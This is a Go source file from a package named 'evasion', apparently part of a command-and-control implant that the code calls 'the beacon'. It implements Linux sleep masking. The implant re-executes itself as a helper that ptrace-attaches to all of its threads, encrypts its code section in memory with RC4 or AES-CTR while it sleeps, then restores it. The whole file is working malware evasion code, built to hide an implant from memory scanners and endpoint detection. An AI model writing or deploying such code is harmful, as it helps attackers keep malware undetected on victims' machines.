//go:build linux

package evasion

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

// Helper protocol: the beacon re-executes itself with this env var
// set. The child attaches with ptrace, masks the parent's .text via
// /proc/<pid>/mem, sleeps, unmasks, detaches, and exits.
//
// Format: pid:base:size:mode:keyhex:ms
const maskHelperEnv = "TORNADO_MASK_HELPER"

// RunMaskHelper executes the helper role when the env var is set.
// It returns true when the process was a helper and must exit.
func RunMaskHelper() bool {
	spec := os.Getenv(maskHelperEnv)
	if spec == "" {
		return false
	}
	_ = os.Unsetenv(maskHelperEnv)
	if err := runMaskHelper(spec); err != nil {
		fmt.Fprintf(os.Stderr, "[mask-helper] %v\n", err)
		os.Exit(1)
	}
	return true
}

func runMaskHelper(spec string) error {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	parts := strings.Split(spec, ":")
	if len(parts) != 6 {
		return fmt.Errorf("bad helper spec %q", spec)
	}
	pid, err := strconv.Atoi(parts[0])
	if err != nil {
		return err
	}
	base, err := strconv.ParseUint(parts[1], 16, 64)
	if err != nil {
		return err
	}
	size, err := strconv.ParseUint(parts[2], 16, 64)
	if err != nil {
		return err
	}
	mode := parts[3]
	key, err := hex.DecodeString(parts[4])
	if err != nil {
		return err
	}
	ms, err := strconv.Atoi(parts[5])
	if err != nil {
		return err
	}

	tids, err := attachAll(pid)
	if err != nil {
		return err
	}
	defer func() {
		for _, tid := range tids {
			_ = syscall.PtraceDetach(tid)
		}
	}()

	buf := make([]byte, int(size))
	if err := vmRead(pid, base, buf); err != nil {
		return fmt.Errorf("read mem: %w", err)
	}
	if err := maskBuffer(buf, mode, key); err != nil {
		return err
	}
	if err := vmWrite(pid, base, buf); err != nil {
		return fmt.Errorf("write mem: %w", err)
	}

	time.Sleep(time.Duration(ms) * time.Millisecond)

	if err := vmRead(pid, base, buf); err != nil {
		return fmt.Errorf("read mem (decrypt): %w", err)
	}
	if err := maskBuffer(buf, mode, key); err != nil {
		return err
	}
	if err := vmWrite(pid, base, buf); err != nil {
		return fmt.Errorf("write mem (decrypt): %w", err)
	}
	return nil
}

type iovec struct {
	base uintptr
	len  uintptr
}

func vmRead(pid int, addr uint64, buf []byte) error {
	local := iovec{uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf))}
	remote := iovec{uintptr(addr), uintptr(len(buf))}
	n, _, errno := syscall.Syscall6(unix.SYS_PROCESS_VM_READV,
		uintptr(pid), uintptr(unsafe.Pointer(&local)), 1,
		uintptr(unsafe.Pointer(&remote)), 1, 0)
	if errno != 0 {
		return errno
	}
	if int(n) != len(buf) {
		return fmt.Errorf("short read %d/%d", n, len(buf))
	}
	return nil
}

func vmWrite(pid int, addr uint64, buf []byte) error {
	local := iovec{uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf))}
	remote := iovec{uintptr(addr), uintptr(len(buf))}
	n, _, errno := syscall.Syscall6(unix.SYS_PROCESS_VM_WRITEV,
		uintptr(pid), uintptr(unsafe.Pointer(&local)), 1,
		uintptr(unsafe.Pointer(&remote)), 1, 0)
	if errno != 0 {
		return errno
	}
	if int(n) != len(buf) {
		return fmt.Errorf("short write %d/%d", n, len(buf))
	}
	return nil
}

func mprotect(addr, size uintptr, prot int) error {
	b := unsafe.Slice((*byte)(unsafe.Pointer(addr)), size)
	return syscall.Mprotect(b, prot)
}

// attachAll stops every thread of pid. Attaching only the main
// thread leaves the rest free to execute encrypted .text.
func attachAll(pid int) ([]int, error) {
	entries, err := os.ReadDir(fmt.Sprintf("/proc/%d/task", pid))
	if err != nil {
		return nil, err
	}
	var tids []int
	for _, e := range entries {
		tid, err := strconv.Atoi(e.Name())
		if err != nil {
			continue
		}
		if err := syscall.PtraceAttach(tid); err != nil {
			if err == syscall.ESRCH {
				continue // thread exited while we were enumerating
			}
			for _, done := range tids {
				_ = syscall.PtraceDetach(done)
			}
			return nil, fmt.Errorf("PTRACE_ATTACH %d: %w", tid, err)
		}
		var status syscall.WaitStatus
		if _, err := syscall.Wait4(tid, &status, 0, nil); err != nil {
			if err == syscall.ECHILD {
				continue
			}
			return nil, fmt.Errorf("wait4 %d: %w", tid, err)
		}
		if !status.Stopped() {
			continue
		}
		tids = append(tids, tid)
	}
	if len(tids) == 0 {
		return nil, fmt.Errorf("no threads to attach")
	}
	return tids, nil
}

func maskBuffer(buf []byte, mode string, key []byte) error {
	switch mode {
	case "rc4":
		RC4Crypt(buf, key)
	case "aes-ctr":
		return AESCTRCrypt(buf, key)
	default:
		return fmt.Errorf("unknown mask mode %q", mode)
	}
	return nil
}

// maskWithHelper masks this process's text while it is stopped.
func maskWithHelper(base, size uintptr, mode string, ms uint32,
	key []byte) error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	spec := fmt.Sprintf("%d:%x:%x:%s:%s:%d",
		os.Getpid(), base, size, mode,
		hex.EncodeToString(key), ms)
	cmd := exec.Command(exe)
	cmd.Env = append(os.Environ(), maskHelperEnv+"="+spec)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	// RWX keeps every thread runnable while the child works.
	if err := mprotect(base, size,
		syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC); err != nil {
		return err
	}
	if err := cmd.Start(); err != nil {
		_ = mprotect(base, size, syscall.PROT_READ|syscall.PROT_EXEC)
		return err
	}
	// PtraceAttach stops us; this returns after the helper detaches.
	werr := cmd.Wait()
	if err := mprotect(base, size,
		syscall.PROT_READ|syscall.PROT_EXEC); err != nil && werr == nil {
		werr = err
	}
	return werr
}

// randomMaskKey returns 32 random bytes.
func randomMaskKey() []byte {
	b := make([]byte, 32)
	if _, err := rand.Read(b); err != nil {
		for i := range b {
			b[i] = byte(i*7 + 3)
		}
	}
	return b
}
